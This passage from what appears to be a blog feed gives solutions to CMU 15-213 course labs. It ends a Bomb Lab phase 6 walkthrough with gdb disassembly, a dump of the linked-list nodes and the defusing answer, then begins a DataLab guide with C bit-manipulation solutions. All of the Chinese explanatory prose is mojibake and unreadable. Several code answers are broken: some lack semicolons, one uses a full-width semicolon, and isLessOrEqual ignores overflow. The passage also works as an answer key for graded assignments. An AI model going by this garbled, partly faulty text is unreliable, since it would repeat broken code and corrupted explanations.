&lt;+217&gt;:   mov    %rdx,%rcx<br>   0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;<br>   0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)<br>   0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp<br>   0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax<br>   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax<br>   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)<br>   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;<br>   0x00000000004011e9 &lt;+245&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx<br>   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp<br>   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;<br>   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp<br>   0x00000000004011fb &lt;+263&gt;:   pop    %rbx<br>   0x00000000004011fc &lt;+264&gt;:   pop    %rbp<br>   0x00000000004011fd &lt;+265&gt;:   pop    %r12<br>   0x00000000004011ff &lt;+267&gt;:   pop    %r13<br>   0x0000000000401201 &lt;+269&gt;:   pop    %r14<br>   0x0000000000401203 &lt;+271&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>åˆ†é˜¶æ®µåˆ†æï¼š</p><ul><li><p>ä»å¼€å¤´åˆ°+18ï¼Œå‡ºç°å‡½æ•°<code>read_six_numbers</code>ï¼Œè¯´æ˜æˆ‘ä»¬çš„è¾“å…¥ä¾æ—§æ˜¯6ä¸ªæ•°å­—ï¼Œè€Œ6ä¸ªæ•°å­—å‚¨å­˜åœ¨<code>%rsp</code>å¼€å¤´çš„æ•°ç»„ä¸­ã€‚</p></li><li><p>+39è¡Œ<code>%eax-1</code>ï¼Œæ§åˆ¶æ¯ä¸ªæ•°ä¸å¤§äº6ã€‚</p></li><li><p>+60 ~ +95ï¼Œè¿™é‡Œä¸»è¦ç”¨äºåˆ¤æ–­ä¸¤æ•°ä¹‹é—´æ˜¯å¦ç›¸ç­‰ã€‚</p></li><li><p>+108 ~ +128ï¼Œå°†å…­ä¸ªæ•°éƒ½è½¬åŒ–ä¸º7-%rax</p></li><li><p>+130 ~ +181ï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ªåœ°å€ï¼š0x6032d0ï¼Œæ‰“å°å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/24w 0x6032d0<br>0x6032d0 &lt;node1&gt;:       332     1       6304480 0<br>0x6032e0 &lt;node2&gt;:       168     2       6304496 0<br>0x6032f0 &lt;node3&gt;:       924     3       6304512 0<br>0x603300 &lt;node4&gt;:       691     4       6304528 0<br>0x603310 &lt;node5&gt;:       477     5       6304544 0<br>0x603320 &lt;node6&gt;:       443     6       0       0<br></code></pre></td></tr></table></figure><p>å‘ç°äº†å…­ä¸ªèŠ‚ç‚¹ï¼Œæ­£è¯´æ˜è¿™ä¸ªåœ°å€å‚¨å­˜çš„æ˜¯ä¸€ä¸ªé“¾è¡¨ã€‚è€Œ<code>mov    0x8(%rdx),%rdx</code>ä»£è¡¨ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚å…¶ä¸­ï¼Œåºå·1~6æ˜¯è¿™äº›èŠ‚ç‚¹çš„ç¼–å·ï¼Œå‰é¢çš„æ•°å­—æ˜¯å‚¨å­˜çš„å€¼ã€‚</p><p>å¾—çŸ¥è¿™ä¸€ç‚¹åï¼Œæˆ‘ä»¬åˆ†æä»£ç ï¼Œå¾—çŸ¥è¿™ä¸€æ®µä»£ç çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨æˆ‘ä»¬è¾“å…¥çš„ç¼–å·åºåˆ—å¯¹å…¶è¿›è¡Œé‡æ–°æ’åºï¼ˆä¹Ÿå°±æ˜¯%rspï¼Œ%rsiå’Œ%rdxä¹‹é—´çš„äº’ç›¸æ“ä½œï¼‰ã€‚</p></li><li><p>+183åï¼šåˆ¤æ–­é“¾è¡¨æ˜¯å¦æ»¡è¶³é™åºã€‚å› æ­¤åœ¨å‰é¢æˆ‘ä»¬éœ€è¦æ»¡è¶³é™åºï¼Œè€Œé™åºçš„é“¾è¡¨å­˜æ”¾çš„æ•°æ®æ˜¯ç»è¿‡7-xå¤„ç†çš„ã€‚å› æ­¤æŒ‰æºå€¼é™åºä¸ºï¼š3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ1ï¼Œ2ï¼Œç»è¿‡å¤„ç†åçš„é™åºä¸º4ï¼Œ3ï¼Œ2ï¼Œ1ï¼Œ6ï¼Œ5ã€‚è¿™å°±æ˜¯æˆ‘ä»¬çš„ç»“æœã€‚</p></li></ul><p>æœ€åæ£€éªŒç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) run ans.txt<br>Starting program: /home/usr/CMU15-213 labs/bomb/bomb ans.txt<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>Welcome to my fiendish little bomb. You have 6 phases with<br>which to blow yourself up. Have a nice day!<br>Phase 1 defused. How about the next one?<br>That&#x27;s number 2.  Keep going!<br>Halfway there!<br>So you got that one.  Try this one.<br>Good work!  On to the next...<br>Congratulations! You&#x27;ve defused the bomb!<br></code></pre></td></tr></table></figure><p>å®Œæˆï¼</p>]]></content>
    
    
    <categories>
      
      <category>CMU15-213</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DataLab</title>
    <link href="/2024/07/01/DataLab/"/>
    <url>/2024/07/01/DataLab/</url>
    
    <content type="html"><![CDATA[<h1 id="DataLab"><a href="#DataLab" class="headerlink" title="DataLab"></a>DataLab</h1><p>ä½œä¸ºCMU15-213çš„ç¬¬ä¸€ä¸ªlabï¼Œdatalabä¹Ÿä¸»è¦å…³æ³¨â€œdataâ€å±‚é¢çš„çŸ¥è¯†ï¼šä½ã€æ•´æ•°ã€æµ®ç‚¹æ•°ã€é€»è¾‘è¿ç®—ã€ä½è¿ç®—ç­‰ã€‚</p><p>ç”±äºç¬”è€…åœ¨å­¦è¿™é—¨è¯¾ä¹‹å‰æœ‰ä¸€å®šçš„æ•°ç”µçŸ¥è¯†ï¼Œæ‰€ä»¥å¯¹è¿™ä¸€èŠ‚çš„çŸ¥è¯†è¾ƒä¸ºç†Ÿæ‚‰ï¼Œæœ‰äº›è§£é¢˜æ€è·¯ä¹Ÿæ¥æºäºæ•°ç”µä¸­çš„ä¸€äº›çŸ¥è¯†è¯¸å¦‚å¸ƒå°”ä»£æ•°ã€De Morganâ€™s Lawç­‰ã€‚</p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œå…ˆLogä¸€ä¸‹Labçš„é£Ÿç”¨æ–¹å¼ã€‚</p><h2 id="é¤å‰å‡†å¤‡"><a href="#é¤å‰å‡†å¤‡" class="headerlink" title="é¤å‰å‡†å¤‡"></a>é¤å‰å‡†å¤‡</h2><p>labé€šå¸¸åœ¨<strong>Linux</strong>ç¯å¢ƒä¸‹å®Œæˆï¼Œé»˜è®¤ä¸º<strong>32ä½ç³»ç»Ÿ</strong>ï¼Œåœ¨Windowsç¯å¢ƒä¸‹ä¸èƒ½é€šè¿‡ç¼–è¯‘ã€‚</p><p>åœ¨ç½‘ç«™ä¸Šï¼Œæˆ‘ä»¬ä¸‹è½½çš„æ–‡ä»¶æ ¼å¼ä¸º **<code>xxxlab-handout.tar</code> ** ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆè¿›è¡Œè§£å‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf datalab-handout.tar<br><span class="hljs-built_in">cd</span> datalab-handout<br></code></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œç¼–è¯‘æ—¶ï¼Œå¦‚æœæ˜¯<strong>64ä½ç³»ç»Ÿ</strong>ï¼Œä½¿ç”¨ <code>make</code> ç¼–è¯‘æ—¶å¯èƒ½ä¼šé‡åˆ°é”™è¯¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/include/limits.h:26:10: fatal error: bits/libc-header-start.h: No such file or directory<br>   26 | <span class="hljs-comment">#include &lt;bits/libc-header-start.h&gt;</span><br>      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~<br>compilation terminated.<br>make: *** [Makefile:11: btest] Error 1<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å®‰è£… <code>gcc-multilib</code> ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Ubuntu</span><br>sudo apt-get install gcc-multilib<br></code></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•ï¼š</p><p><code>btest</code>ï¼šç”¨äºæµ‹è¯•ä½ çš„å‡½æ•°æ˜¯å¦æ­£ç¡®ã€‚ä»…åœ¨ä¸€ä¸ªå°çš„æµ‹è¯•é›†ä¸Šè¿›è¡Œæµ‹è¯•ï¼Œä¸èƒ½å®Œå…¨ä¿è¯ä½ çš„å‡½æ•°æ˜¯æ­£ç¡®çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ç¼–è¯‘å¹¶è¿è¡Œ</span><br>make &amp;&amp; ./btest<br><span class="hljs-comment"># å¯¹æŸä¸ªå‡½æ•°è¿›è¡Œå•å…ƒæµ‹è¯•</span><br>make &amp;&amp; ./btest -f bitXnor<br><span class="hljs-comment"># å¯¹æŸä¸ªå‡½æ•°è¿›è¡Œå•å…ƒæµ‹è¯•ï¼Œä¸”æŒ‡å®šæµ‹è¯•ç”¨ä¾‹ï¼Œä»¥ -1 æŒ‡å®šç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¾æ¬¡ç±»æ¨</span><br>make &amp;&amp; ./btest -f bitXnor -1 7 -2 0xf<br></code></pre></td></tr></table></figure><p><code>dlc</code>ï¼šç”¨äºæ£€æŸ¥ä½ çš„ä»£ç æ˜¯å¦ç¬¦åˆè§„èŒƒã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦ç¬¦åˆç¼–ç è§„èŒƒ</span><br>./dlc bits.c<br></code></pre></td></tr></table></figure><p><code>bdd checker</code>ï¼šç©·ä¸¾æµ‹è¯•æ‰€æœ‰å¯èƒ½çš„è¾“å…¥ï¼Œå®Œæ•´åœ°æ£€æŸ¥ä½ çš„å‡½æ•°æ˜¯å¦æ­£ç¡®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯¹æŸä¸ªå‡½æ•°è¿›è¡Œå•å…ƒæµ‹è¯•</span><br>./bddcheck/check.pl -f bitXnor<br><span class="hljs-comment"># æ£€æŸ¥æ‰€æœ‰å‡½æ•°</span><br>./bddcheck/check.pl<br><span class="hljs-comment"># æ£€æŸ¥æ‰€æœ‰å‡½æ•°ï¼Œä¸”è¾“å‡ºæ€»ç»“ä¿¡æ¯</span><br>./bddcheck/check.pl -g<br></code></pre></td></tr></table></figure><p><code>driver.pl</code>ï¼šç”¨äºè¯„åˆ†ï¼Œæ£€æŸ¥ä½ çš„å‡½æ•°æ˜¯å¦ç¬¦åˆè§„èŒƒä¸”æ­£ç¡®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./driver.pl<br></code></pre></td></tr></table></figure><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><ol><li><p>bitXorï¼šç”¨  <code>~  &amp;</code>  å®ç°^ã€‚</p><p>æ€è·¯ï¼šå¾ˆåŸºç¡€çš„ä¸€é“æ•°ç”µé¢˜ã€‚ç†Ÿæ‚‰çš„åŒå­¦å¯ä»¥ç›´æ¥èƒŒæ¿ï¼š$A\oplus B&#x3D;A\bar B+\bar AB&#x3D;\overline{\overline{A\bar B}\cdot\overline{\bar AB}}$ï¼Œæ­¤å¤„ç»“åˆXORè¿ç®—çš„åŸºæœ¬å®šä¹‰å’ŒDe Morganâ€™s Lawã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">return</span> ~(~(x&amp;(~y))&amp;(~(~x &amp; y)));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>tminï¼šä»…ä½¿ç”¨  <code>!  ~  &amp;  ^  |  +  &lt;&lt;  &gt;&gt;</code>  ï¼Œåœ¨å››æ­¥æ“ä½œå†…è¿”å›æœ€å°çš„è¡¥ç æ•´æ•°ã€‚</p><p>æ€è·¯ï¼šä»¥å…«ä½ä¸ºä¾‹ï¼Œæœ€å°çš„è¡¥ç æ•´æ•°ä¸º$1000 \ 0000$ã€‚è€ƒè™‘å·¦ç§»è¿ç®—å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>isTmaxï¼šä½¿ç”¨  <code>! ~ &amp; ^ | +</code>  ï¼Œåœ¨xä¸ºè¡¥ç æœ€å¤§å€¼æ—¶è¿”å›1ï¼Œå¦åˆ™è¿”å›0</p><p>æ€è·¯ï¼š32ä½ç³»ç»Ÿä¸­ï¼Œè¡¥ç æœ€å¤§å€¼ä¸º$011â€¦111$ï¼Œä½¿ç”¨ <code>x ^ 011...111</code>å¯ä»¥åœ¨ç›¸åŒæ—¶è¾“å‡º0ï¼Œè€Œä¸åŒæ—¶<code>x^011...111</code>çš„ç»“æœä¸€å®šä¸ä¸º0ï¼Œè¢«è§†ä¸º<code>Ture(1)</code>ï¼Œæ•…åªéœ€è¦<code>!(x^011...111)</code>å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !(x^<span class="hljs-number">2147483647</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†å¾ˆé—æ†¾çš„æ˜¯ï¼Œlabåªå…è®¸æˆ‘ä»¬ä½¿ç”¨ä¸å¤§äº<code>0xFF</code>çš„æ•´å‹å¸¸é‡ğŸ˜¢ï¼Œäºæ˜¯æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹è§£æ³•ï¼š</p><p>ç”±äºä»…æœ‰ä¸€ç§æƒ…å†µä¼šè¾“å‡º1ï¼Œæˆ‘ä»¬ä»è¿™ç§æƒ…å†µå…¥æ‰‹è€ƒè™‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-comment">// è€ƒè™‘ä»…x=Tmaxæˆ–x=-1æ—¶x+1==~xã€‚</span><br>    <span class="hljs-type">int</span> t=x+<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> m=~x;<br>    <span class="hljs-type">int</span> p = t^m;<br>    <span class="hljs-keyword">return</span> !p &amp; (!!m);  <span class="hljs-comment">//  æ’é™¤-1å½±å“</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>allOddBitsï¼šä½¿ç”¨<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>ï¼Œåˆ¤æ–­32ä½æ•´æ•°ä¸­æ‰€æœ‰å¥‡æ•°ä½æ˜¯å¦å‡ä¸º1ï¼Œæ˜¯çš„è¯è¿”å›1.</p><p>ä¾‹å­ï¼š0xAA&#x3D;10101010ï¼Œä»å³å¾€å·¦ç¼–å·ä¸º0~7ï¼Œæ‰€æœ‰å¥‡æ•°ä½å‡ä¸º1ï¼Œè¿”å›1.</p><p>æ€è·¯ï¼šè€ƒè™‘æ•°<code>0xAAAAAAAA</code>ï¼Œæˆ‘ä»¬å‘ç°ï¼Œä»»ä½•å¥‡æ•°ä½å…¨ä¸º1çš„æ•°ä¸è¯¥æ•°è¿›è¡Œ<code>&amp;</code>è¿ç®—çš„ç»“æœå‡ä¸º<code>0xAAAAAAAA</code>ã€‚äºæ˜¯æˆ‘ä»¬åªéœ€è¦æ„å»ºå‡ºè¿™ä¸ªæ•°ï¼Œå†åˆ¤æ–­è¿›è¡Œ<code>&amp;</code>è¿ç®—åæ˜¯å¦ç›¸ç­‰å³å¯ã€‚</p><p>æ ¹æ®è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸å¤§äº<code>0xFF</code>çš„å¸¸é‡ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥ä»<code>0xAA</code>å¼€å§‹ï¼Œåˆ©ç”¨å·¦ç§»å’Œ|æ„å»ºæ©ç ã€‚ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// æ„é€ æ©ç 0xAAAAAAAA</span><br>  <span class="hljs-type">int</span> mask = (<span class="hljs-number">0xAA</span> &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0xAA</span>;<br>  mask = (mask &lt;&lt; <span class="hljs-number">16</span>) | mask;<br>  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ç›¸ç­‰</span><br>  <span class="hljs-keyword">return</span> !((x &amp; mask) ^ mask);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>negateï¼šä½¿ç”¨<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>ï¼Œè¿”å›è¾“å…¥å€¼çš„ç›¸åæ•°ã€‚</p><p>æ€è·¯ï¼šåˆ©ç”¨ç›¸åæ•°çš„æ€§è´¨ï¼Œå³äº’ä¸ºç›¸åæ•°çš„ä¸¤æ•°ç›¸åŠ ä¸º0ã€‚è€Œé€šè¿‡å–åæ“ä½œå¾—åˆ°çš„ä¸¤æ•°ç›¸åŠ ä¸º-1ï¼ˆ111â€¦111ï¼‰ã€‚å› æ­¤ç›¸åæ•°å³ä¸ºå–åï¼‹1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>isAsciiDigitï¼šä½¿ç”¨<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>ï¼Œè¿”å›Trueåœ¨xä»‹äº0x30å’Œ0x39ä¹‹é—´æ—¶ã€‚</p><p>æ€è·¯ï¼šæœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨ä½è¿ç®—å®ç°å¤§å°æ¯”è¾ƒã€‚è€Œæ¯”è¾ƒä¸¤ä¸ªæ•°çš„å¤§å°é€šå¸¸æœ‰å·®å€¼æ³•ã€æ¯”å€¼æ³•ç­‰ã€‚åŸºäºä¸Šä¸€é¢˜çš„å¯å‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å·®å€¼æ³•æ¥è¿›è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> negative_x = ~x+<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> inf = negative_x + <span class="hljs-number">0x30</span>;<br>    <span class="hljs-type">int</span> sup = negative_x + <span class="hljs-number">0x39</span>;<br><span class="hljs-comment">// æ¥ä¸‹æ¥åˆ¤æ–­inf&lt;=0ï¼Œsup&gt;=0ï¼Œåˆ©ç”¨è¡¥ç æœ€é«˜æœ‰æ•ˆä½æ˜¯å¦ä¸º1è¿›è¡Œåˆ¤æ–­ã€‚</span><br>    <span class="hljs-type">int</span> Tmin = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">return</span> (!!(Tmin &amp; inf) | !inf )&amp; !(Tmin &amp; sup)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>conditionalï¼šä½¿ç”¨<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>ï¼Œå®ç°ä¸‰ç›®è¿ç®—ç¬¦<code>x ? y : z</code>ã€‚</p><p>æ€è·¯ï¼šæˆ‘é¦–å…ˆçš„æƒ³æ³•æ˜¯è®©xæ¥æ§åˆ¶yå’Œzï¼Œå³ä¸¤ç§æƒ…å†µä¸‹åˆ†åˆ«å°†yå’Œzç½®0ï¼Œå³æ¶ˆé™¤æŸä¸€é¡¹çš„å½±å“ï¼Œç„¶ååˆ©ç”¨<code>|</code>æ“ä½œï¼Œåˆå¹¶ä¸¤é¡¹ã€‚ä½†é¦–å…ˆå‘ç°å•çº¯åˆ©ç”¨&amp;æ“ä½œæ— æ³•ä¿ç•™yæˆ–xã€‚äºæ˜¯è¿™é‡Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨æ©ç çš„æ€æƒ³ï¼Œå³è€ƒè™‘æ•°å­—ä¸0çš„æ“ä½œï¼š<strong>a&amp;0&#x3D;0,a&amp;0xFFFFFFFF&#x3D;a</strong>ï¼Œè¿™æ ·å°±å®ç°äº†<strong>æ¶ˆé™¤å’Œä¿ç•™</strong>ã€‚äºæ˜¯æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯å°†<strong>1è½¬åŒ–ä¸º0xFFFFFFFF</strong>ï¼Œé—®é¢˜è¿åˆƒè€Œè§£ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>    <span class="hljs-type">int</span> mask = !!x;  <span class="hljs-comment">//  ä¸€ç§æ©ç ï¼Œå°†xè½¬ä¸º0æˆ–1</span><br>    mask = ~mask+<span class="hljs-number">1</span>ï¼›  <span class="hljs-comment">//å°†0è½¬ä¸º0x00,1è½¬ä¸º0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> (y &amp; mask) | (z &amp; ~mask);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>isLessOrEqualï¼šä½¿ç”¨<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>ï¼Œå®ç°<code>&lt;=</code>çš„åŠŸèƒ½ã€‚</p><p>æ€è·¯ï¼šä¾æ—§æ˜¯å·®å€¼æ¯”è¾ƒæ³•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-type">int</span> negative_y = ~y+<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> sum = x+negative_y;<br>    <span class="hljs-type">int</span> mask = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">return</span> !!(mask&amp;sum) | !sum ;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>logicalNegï¼šä½¿ç”¨<code>~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>ï¼Œå®ç°<code>!</code>è¿ç®—ç¬¦çš„åŠŸèƒ½ã€‚</p><p>æ€è·¯ï¼š<code>!</code>è¿ç®—ç¬¦å°†0å˜ä¸º1ï¼Œå°†é0çš„å˜ä¸º0ã€‚åˆ¤æ–­ä¸€ä¸ªæ•°éé›¶çš„å¸¸ç”¨æŠ€å·§ï¼šå¦‚æœä¸€ä¸ªæ•°é0ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°åŠå…¶ç›¸åæ•°çš„æœ€é«˜ä½ä¸€å®šæœ‰ä¸€ä¸ªä¸º1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> negx = ~x+<span class="hljs-number">1</span>;<br>  <span class="hljs-type">int</span> sign = (x|negx)&gt;&gt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">return</span> sign^<span class="hljs-number">1</span>;    <span class="hljs-comment">//(?)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆè‡ªç„¶çš„æƒ³æ³•ï¼Œä¹ä¸€çœ‹æ²¡é—®é¢˜ï¼Œä½†è¿™é‡Œçš„å‘åœ¨äºâ€”â€”Cè¯­è¨€çš„å³ç§»é»˜è®¤ä¸ºç®—æœ¯å³ç§»ï¼Œå³å¯¹äºè´Ÿæ•°å³ç§»ä¼šåœ¨å·¦ä¾§å¡«å……<strong>1</strong>.äºæ˜¯è¿™é‡Œçš„signä¸æ˜¯0 or 1ï¼Œè€Œæ˜¯ <strong>-1ï¼ˆ0xFFFFFFFFï¼‰ or 0</strong>ï¼Œæ•…æœ€åä¸€è¡Œåº”ä¸ºsign+1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-type">int</span> negx = ~x+<span class="hljs-number">1</span>;<br>  <span class="hljs-type">int</span> sign = (x|negx)&gt;&gt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">return</span> sign + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>howManyBitsï¼šä½¿ç”¨<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>ï¼Œè¿”å›ç”¨è¡¥ç è¡¨ç¤ºxæ‰€éœ€çš„æœ€å°‘ä½æ•°ã€‚ã€</p></li></ol><p>   